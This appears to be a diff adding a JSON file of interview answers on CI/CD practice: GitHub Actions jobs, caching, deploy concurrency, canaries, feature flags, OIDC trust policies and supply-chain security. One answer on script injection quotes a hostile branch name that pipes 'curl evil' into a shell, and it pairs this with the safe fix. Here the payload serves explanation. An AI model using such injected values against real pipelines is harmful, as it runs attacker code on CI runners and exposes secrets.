@@ -1,0 +1,117 @@
+{
+ "interview": [
+  {
+   "code": null,
+   "followUps": [
+    "<p>A good pipeline is fast, trustworthy and easy to act on, not just green. Fast means feedback in minutes, so people do not batch changes. Trustworthy means no flaky tests and the same result on every run. Actionable means a failure names the step and cause.</p><p>It also builds the artifact once and promotes that same artifact, uses least-privilege secrets, and is cheap to change. A pipeline that takes 40 minutes or is green but skips tests is worse than a short honest one.</p>",
+    "<p>Look at the four DORA metrics: deployment frequency, lead time for changes, change failure rate and time to restore service. The first two show speed, the last two show stability.</p><p>Example: if you deploy 20 times a week, lead time is 1 day, 5 percent of deploys cause an incident and you recover in 30 minutes, CD is working. If frequency rises but failure rate also rises, you are going faster by cutting safety. Measure per service and watch trends, not one number.</p>"
+   ]
+  },
+  {
+   "code": null,
+   "followUps": [
+    "<p>Each job runs on its own fresh runner, so files from job A live on a machine that is destroyed when A ends. Job B starts on a different clean VM.</p><p>To share a file, upload it with <code>actions/upload-artifact</code> in A and download it in B, and declare <code>needs: A</code> so B waits. For a small value such as a version string, write it to <code>$GITHUB_OUTPUT</code> and read it as <code>needs.A.outputs.version</code>. Putting build and test in one job avoids the problem when they are cheap.</p>",
+    "<p><code>if: always()</code> makes a step or job run even when an earlier step failed or the run was cancelled. Normally later steps are skipped after a failure.</p><p>Use it for cleanup and reporting: uploading test reports, shutting down a test database, or sending a notification. Example: <code>- if: always()</code> then <code>uses: actions/upload-artifact</code> keeps the failing logs. Prefer <code>failure()</code> when you only want it on failure, and <code>!cancelled()</code> when cancelled runs should skip it.</p>"
+   ]
+  },
+  {
+   "code": {
+    "title": "Balance test shards: round-robin vs greedy",
+    "python": "# Balance test shards: greedy (longest test first onto the emptiest shard)\ntests = {\"a\": 9, \"b\": 8, \"c\": 7, \"d\": 6, \"e\": 5, \"f\": 4, \"g\": 3, \"h\": 2}  # minutes\nshards = 3\n\n# Naive: round-robin by name ignores duration\nnaive = [0] * shards\nfor i, t in enumerate(sorted(tests)):\n    naive[i % shards] += tests[t]\n\n# Greedy: biggest first, always onto the lightest shard\ngreedy = [0] * shards\nfor t in sorted(tests, key=tests.get, reverse=True):\n    k = greedy.index(min(greedy))\n    greedy[k] += tests[t]\n\nprint(\"tests (min):\", tests)\nprint(\"round-robin shard times:\", naive, \"-> pipeline waits\", max(naive))\nprint(\"greedy shard times:     \", greedy, \"-> pipeline waits\", max(greedy))\n# Sorting is O(n log n); the job time is the slowest shard, not the average.\n"
+   },
+   "followUps": [
+    "<p>Every job has a startup cost, usually 20 to 60 seconds for the runner, checkout and dependency restore, and this is paid again for each job.</p><p>Example: a 6 minute test job split into 4 jobs of 1.5 minutes each, plus 1 minute of setup each, takes 2.5 minutes in parallel, a clear win. Split it into 12 and each has 0.5 minutes of work plus 1 minute setup, so you pay 1.5 minutes and use three times the runner minutes. Runners can also be queued, so extra jobs wait. Stop splitting when setup time rivals the work.</p>",
+    "<p>Balance shards by test duration, not by file count. Use timings from the previous run, sort tests from slowest to fastest, and put each on the currently lightest shard.</p><p>Example with 3 shards: times 9,8,7,6,5,4,3,2 give shards of 16, 15 and 13 minutes; naive round-robin gives 18, 15 and 11. The run takes as long as the slowest shard. Refresh timings regularly, and keep large tests splittable. Cost: sorting is O(n log n), trivial.</p><pre><code>for t in sortedBySlowest(tests)\n  shard = lightest(shards)\n  shard.add(t)</code></pre>"
+   ]
+  },
+  {
+   "code": {
+    "title": "Cache key lookup: exact match then restore-key prefixes",
+    "python": "# GitHub-style cache lookup: exact key first, then restore-keys as prefixes\ncaches = [  # (key, age: higher = newer)\n    (\"linux-node20-aaa111\", 1),\n    (\"linux-node20-bbb222\", 2),\n    (\"linux-node18-ccc333\", 3),\n]\n\ndef restore(key, restore_keys):\n    for k, _ in caches:\n        if k == key:\n            return k, \"exact hit\"\n    for prefix in restore_keys:  # tried in order\n        matches = [c for c in caches if c[0].startswith(prefix)]\n        if matches:\n            newest = max(matches, key=lambda c: c[1])  # newest entry wins\n            return newest[0], \"partial hit (prefix \" + prefix + \")\"\n    return None, \"miss\"\n\nprint(\"caches:\", [c[0] for c in caches])\nprint(restore(\"linux-node20-bbb222\", []))\nprint(restore(\"linux-node20-zzz999\", [\"linux-node20-\", \"linux-\"]))\nprint(restore(\"linux-node22-zzz999\", [\"linux-node22-\"]))\n# Too-broad prefix (\"linux-\") would pick the node18 cache: stale data.\nprint(restore(\"linux-node22-zzz999\", [\"linux-\"]))\n"
+   },
+   "followUps": [
+    "<p>Avoid restore-keys when a partial hit would be wrong or harmful, for example a compiled output where stale files could be reused silently.</p><p>Restore-keys are fine for dependency downloads, because the package manager then fetches only what changed. They are risky for build output, generated code and anything tied to the compiler version. Example: restoring an older <code>linux-</code> cache built with another Node version can produce odd native-module errors. If you use them, make the prefix specific (OS and tool version) and still verify.</p>",
+    "<p>Use an artifact. A cache is a best-effort speed-up that may be missing or evicted, while an artifact is a guaranteed output of a specific run.</p><p>If a later job must have the binary to work, that is a dependency, so upload it with <code>upload-artifact</code> and download it in the next job. Caches are shared between runs, scoped by branch and limited to 10 GB, so they are right for downloads like <code>node_modules</code>. Example: the release job needs exactly the binary tests passed on, so it downloads the artifact by name.</p>"
+   ]
+  },
+  {
+   "code": {
+    "title": "Racing deploys: queue and never-go-backwards guard",
+    "python": "# Two deploys race. Without a lock the slower older one finishes last.\ndeploys = [(\"v1-older\", 5), (\"v2-newer\", 2)]  # (version, minutes to finish)\n\n# Unsafe: both run at once; whoever finishes last wins\nlive = None\nfor name, dur in sorted(deploys, key=lambda d: d[1]):\n    live = name\nprint(\"parallel, no concurrency group -> live:\", live)\n\n# Queue (cancel-in-progress false): one runs, newest pending replaces older pending\nrunning, pending = None, None\norder = []\nfor name, _ in deploys:  # arrival order\n    if running is None:\n        running = name\n    else:\n        pending = name  # a newer arrival replaces the pending one\norder.append(running)\nif pending:\n    order.append(pending)\nprint(\"queued run order:\", order)\n\n# Guard: never go backwards\nlive_version = 0\nfor name in order:\n    num = int(name[1])\n    if num < live_version:\n        print(name, \"skipped: older than live v%d\" % live_version)\n    else:\n        live_version = num\n        print(name, \"deployed\")\nprint(\"live: v%d\" % live_version)\n"
+   },
+   "followUps": [
+    "<p>Cancelling a deploy halfway can leave production half updated: some servers new, some old, a migration run but code not switched. That is worse than waiting.</p><p>With <code>cancel-in-progress: false</code> the running deploy finishes, and the queue holds only the newest pending run. Example: runs 1, 2 and 3 arrive; run 1 runs, run 2 is replaced by 3, so 1 then 3 deploy. CI is different: a cancelled test run costs nothing, so cancelling it saves minutes.</p>",
+    "<p>Give the deploy jobs in all workflows the same concurrency group name, for example <code>group: deploy-production</code>. GitHub then allows only one running and one pending run across them.</p><p>Best is to put the deploy in one reusable workflow that every caller uses, so the group lives in one place. Use a different group per environment so staging does not block production. For stricter ordering, check the live version and the commit date before deploying and refuse to go backwards.</p><pre><code>concurrency:\n  group: deploy-production\n  cancel-in-progress: false</code></pre>"
+   ]
+  },
+  {
+   "code": null,
+   "followUps": [
+    "<p>Plan the change as a versioned, communicated release. Shared workflows are called by many repos, so a breaking change affects all of them at once if they follow a moving reference.</p><p>Steps: publish the new version as a new tag (v2) and keep v1 working; announce it with a migration guide; use a bot to open upgrade pull requests in each repo; track which repos still use v1; remove v1 after a deadline. Callers pin a tag or SHA, so they upgrade on their own schedule. Avoid editing a tag in place.</p>",
+    "<p>The ideas match. GitLab <code>include</code> pulls in shared YAML and <code>extends</code> reuses job definitions, similar to a reusable workflow. Jenkins shared libraries are Groovy code loaded into pipelines.</p><p>Differences: a GitHub reusable workflow is a whole job with its own runner and typed inputs; a composite action only bundles steps. GitLab <code>include</code> is text merging, so errors show up late. Jenkins libraries are the most powerful but are real code that needs tests and versioning. Pin versions in all three.</p>"
+   ]
+  },
+  {
+   "code": null,
+   "followUps": [
+    "<p>Check what is different about the build, not the syntax: triggers, agents or labels, credentials, plugins, shared libraries and environment variables.</p><p>First list every plugin and shared-library call the Jenkinsfile uses and find an equivalent. Then move logic into scripts so only the thin orchestration is rewritten. Check how secrets are injected, how approvals work, and how artifacts and test reports are stored. Run old and new in parallel for a while and compare results. Example: <code>withCredentials</code> becomes <code>secrets.NAME</code> or OIDC.</p>",
+    "<p>Plugins and third-party actions run with your pipeline's permissions, so a compromised or abandoned one can read secrets or alter builds. They also break on upgrades and can conflict with each other.</p><p>Reduce the risk: keep only the plugins you use, pin versions (in GitHub, full commit SHAs), give least-privilege credentials, review updates, and prefer plain scripts for small tasks. Jenkins plugins in particular have many security advisories, so patching the controller regularly matters. Example: a 20-line shell step is safer than an unmaintained action.</p>"
+   ]
+  },
+  {
+   "code": null,
+   "followUps": [
+    "<p>Put the repository, branch or environment into the cloud trust policy's <code>sub</code> claim so only that exact workflow can assume the role.</p><p>Example GitHub subject: <code>repo:my-org/my-app:environment:production</code>. Do not use a wildcard like <code>repo:my-org/*</code>, because any repo, including a fork or a test one, could then get production access. Also check the audience (<code>aud</code>), and use environment-based subjects so the approval rules apply. Each role gets only the permissions it needs.</p>",
+    "<p>Treat it as compromised: rotate the secret first, then clean up. Deleting the log alone is not enough because it may already have been copied.</p><p>Steps: revoke and issue a new value; check audit logs for use between leak and rotation; delete or redact the run logs; find the cause (a debug print, a transformed value that masking missed, a fork workflow). Then add a guard, and consider OIDC so there is nothing to rotate next time. Rotation is the fix; masking only hides text.</p>"
+   ]
+  },
+  {
+   "code": {
+    "title": "Canary promote or roll back by error-rate rule",
+    "python": "# Canary: compare error rate against baseline and decide automatically\ndef decide(base_err, canary_err, canary_reqs, min_reqs=500, max_ratio=1.5, slack=0.002):\n    if canary_reqs < min_reqs:\n        return \"wait (only %d requests, need %d)\" % (canary_reqs, min_reqs)\n    if canary_err > base_err * max_ratio + slack:\n        return \"ROLLBACK\"\n    return \"promote\"\n\nsteps = [5, 25, 50, 100]  # traffic percent\n# (baseline error, canary error, canary requests) observed at each step\nobs = [(0.010, 0.011, 300), (0.010, 0.012, 2500), (0.010, 0.031, 5000)]\nfor pct, (b, c, n) in zip(steps, obs):\n    d = decide(b, c, n)\n    print(\"%3d%% traffic base=%.3f canary=%.3f n=%d -> %s\" % (pct, b, c, n, d))\n    if d == \"ROLLBACK\":\n        print(\"traffic back to 0% canary\")\n        break\n"
+   },
+   "followUps": [
+    "<p>Set the rollback rules in advance as numbers, compared against the current baseline, and let the system apply them. Humans decide the thresholds, not the incident.</p><p>Example: roll back if the canary error rate is above 1.5 times baseline plus 0.2 percentage points, or p99 latency is 20 percent worse, for 5 minutes with at least 500 requests. Add business signals like checkout success. Promote at each step only if all hold. Test the rule on a deliberately bad build so you know it fires.</p>",
+    "<p>If traffic is too low, a canary cannot prove anything, so extend the observation time, lower the number of steps, or use synthetic traffic.</p><p>Example: 5 percent of 100 requests per hour is 5 requests, which says nothing about a 1 percent error rate. Options: wait until you have a minimum sample (say 500), replay recorded traffic, run synthetic checks, or use a staged rollout by internal users first. For very low traffic services, blue-green with a smoke test is simpler and honest.</p>"
+   ]
+  },
+  {
+   "code": null,
+   "followUps": [
+    "<p>Starting the app runs the migration on every instance at the same moment, which is risky and hard to control.</p><p>Problems: several instances race to change the schema; a slow migration delays start-up and fails health checks, so the platform restarts it in a loop; the app may need a powerful database account in production; and a failed deploy cannot roll back the schema. A separate pipeline job runs it once, under a lock, with logging and review, before the new code goes out.</p>",
+    "<p>Run the previous release's tests against a database that already has the new migration applied. If they pass, the old version still works.</p><p>Steps: build the old commit; apply the new migrations to a test database; run the old integration suite. Example: you add a nullable column and the old insert still works, but if you made it NOT NULL with no default, the old insert fails and the test catches it. Also run the new code against the old schema, in case the migration is delayed. Do this in CI for every migration.</p>"
+   ]
+  },
+  {
+   "code": {
+    "title": "Percentage rollout with a stable hash bucket",
+    "python": "# Percentage rollout for a feature flag: stable hash puts each user in a bucket 0-99\nimport hashlib\n\ndef bucket(flag, user):\n    h = hashlib.sha256((flag + \":\" + user).encode()).hexdigest()\n    return int(h, 16) % 100  # same user + flag always gives the same bucket\n\ndef enabled(flag, user, percent, staff=()):\n    if user in staff:\n        return True  # staff see it first\n    return bucket(flag, user) < percent\n\nusers = [\"u%d\" % i for i in range(1000)]\nfor pct in (0, 10, 50, 100):\n    on = sum(enabled(\"new-checkout\", u, pct) for u in users)\n    print(\"rollout %3d%% -> %d of 1000 users\" % (pct, on))\n\n# Raising 10% -> 50% keeps everyone who already had it\nten = {u for u in users if enabled(\"new-checkout\", u, 10)}\nfifty = {u for u in users if enabled(\"new-checkout\", u, 50)}\nprint(\"10% group still on at 50%:\", ten <= fifty)\n# Kill switch = set percent to 0, no deploy needed.\n"
+   },
+   "followUps": [
+    "<p>Remove flags on a schedule: every flag gets an owner and an expiry date when created, and expired flags become tickets.</p><p>Once a flag has been at 100 percent for a couple of weeks, delete the flag and the dead branch of code in one small pull request. Keep a list of flags with age, and fail CI or alert when one passes its date. Example: a release flag should live days or weeks; only permission or ops flags are long-lived and are named as such.</p>",
+    "<p>Partly. A flag can turn off new behaviour in seconds, which is often faster than a rollback, but it does not undo everything.</p><p>It does not help when the bug is in code outside the flag, the build or config itself, or when the flag already caused data written in a new format. So keep a normal rollback path. Example: a flag that guards a new price calculation can be switched off at once, but a bad migration still needs a rollback and restore plan.</p>"
+   ]
+  },
+  {
+   "code": null,
+   "followUps": [
+    "<p>Anything the contributor can set: pull request title, branch name, body, commit messages, labels, issue text, and file contents.</p><p>These are dangerous when inserted into a shell step with <code>${{ }}</code>, because the text becomes part of the script. Example: a branch named <code>a\"; curl evil | sh; \"</code> runs commands. Pass them through an environment variable and quote it in the script instead. Also treat artifacts from fork runs as untrusted data.</p><pre><code>env:\n  TITLE: ${{ github.event.pull_request.title }}\nrun: echo \"$TITLE\"</code></pre>",
+    "<p>Search all repos automatically instead of reading them. Use code search or an API script to find every workflow containing <code>pull_request_target</code> or <code>workflow_run</code>, then check whether they check out PR code.</p><p>Steps: list repos (300 is quick with the API); fetch <code>.github/workflows/*.yml</code>; flag risky patterns; run a linter such as actionlint or zizmor in CI for all repos; fix the top offenders first. Enforce with an organization rule and a shared template so new repos start safe.</p>"
+   ]
+  },
+  {
+   "code": null,
+   "followUps": [
+    "<p>Pinning to a SHA means a tag cannot be moved under you. A tag like <code>v4</code> is just a label that the action's owner, or an attacker who steals their account, can point at new malicious code.</p><p>Dependabot proposes the bump as a visible pull request, so a human or check reviews the new commit before it is used. Without pinning, the change happens silently on the next run. Example: a hijacked tag could exfiltrate your secrets in minutes; a pinned SHA keeps running the old safe code.</p>",
+    "<p>Provenance proves where and how an artifact was built, not that it is safe. It says repo, commit and workflow built this digest; it does not say the code is bug-free or free of malware.</p><p>If an attacker merged malicious code, or a dependency was already poisoned, the provenance is still valid. It also does not protect a build that was run on a compromised runner unless the build is isolated. So combine it with code review, dependency scanning and verification at deploy time, which checks the right workflow built it.</p>"
+   ]
+  },
+  {
+   "code": null,
+   "followUps": [
+    "<p>Track failure rate per test, flaky rate (failed then passed on rerun), the time developers lose to reruns, and the number of quarantined tests.</p><p>Healthy example: fewer than 1 in 100 runs fails with no code change, quarantine list is short and shrinking, main is green over 95 percent of the time, and the suite finishes in the target time. Trends matter: a growing quarantine list means debt is accumulating. Report these per team so ownership is clear.</p>",
+    "<p>Find what differs between CI and your machine, then reproduce it there. Common causes: slower or fewer CPUs, different timing, test order or parallelism, missing services, different time zone, locale or file paths.</p><p>Steps: re-run with the same seed and order; add logs and save artifacts or screenshots; run in a container like CI, or with limited CPU; run it 100 times in a loop to measure the rate. Example: a test that waits a fixed 1 second passes on a laptop and fails on a busy runner; replace the sleep with a wait for a condition.</p>"
+   ]
+  }
+ ]
+}
